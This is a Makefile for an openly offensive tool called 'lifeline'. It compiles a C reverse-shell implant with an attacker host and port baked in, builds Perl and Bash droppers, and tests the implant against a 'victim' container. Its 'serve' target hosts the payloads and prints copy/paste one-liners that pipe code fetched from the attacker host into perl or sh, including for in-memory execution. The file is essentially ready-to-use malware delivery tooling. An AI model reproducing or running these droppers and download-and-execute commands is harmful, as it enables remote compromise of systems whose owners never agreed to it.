# Set the default port to :1337
PORT ?= 1337

# Default number of linelines to be launched
NUM ?= 10

# Settings for python -m http.server
PY_PORT ?= 8000

.PHONY: lifeline
lifeline:	src/main.c src/reverse.c src/util.c Makefile
ifndef HOST
	$(error HOST is not set, use "make HOST=x.x.x.x")
endif
	mkdir -p build
	$(CC) src/main.c src/reverse.c src/util.c -lpthread -o build/lifeline -I .	\
		-DHOST=\"$(HOST)\"					\
		-DPORT=$(PORT)

.PHONY: test
test:	lifeline
	cd test; docker-compose run --rm victim 

.PHONY: dropper.pl
dropper.pl:	lifeline extra/make_perl_dropper.sh
	cd extra; ./make_perl_dropper.sh $(NUM)

.PHONY: dropper.sh
dropper.sh:	lifeline extra/make_bash_dropper.sh
	cd extra; ./make_bash_dropper.sh $(HOST) $(PY_PORT) $(NUM)

.PHONY: serve
serve:	lifeline dropper.pl dropper.sh
	@echo "========================================================="
	@echo "  Hosting dropper on http://$(HOST):$(PY_PORT)...        "
	@echo "  Copy/Paste payloads:                                   "
	@echo "                                                         "
	@echo " In memory:                                              "
	@echo "  curl http://$(HOST):$(PY_PORT)/dropper.pl | perl       "
	@echo "  wget -O - http://$(HOST):$(PY_PORT)/dropper.pl | perl  "
	@echo "                                                         "
	@echo " Temp file:                                              "
	@echo "  curl http://$(HOST):$(PY_PORT)/dropper.sh | sh         "
	@echo "  wget -O - http://$(HOST):$(PY_PORT)/dropper.sh | sh    "
	@echo "                                                         "
	@echo " Raw download:                                           "
	@echo "  curl http://$(HOST):$(PY_PORT)/lifeline > lifeline     "
	@echo "  wget http://$(HOST):$(PY_PORT)/lifeline                "
	@echo "========================================================="
	@echo ""
	@cd build; python3 -m http.server $(PY_PORT)

.PHONY: clean
clean:	
	rm -f ./build/dropper.pl
	rm -f ./build/dropper.sh
	rm -f ./build/lifeline
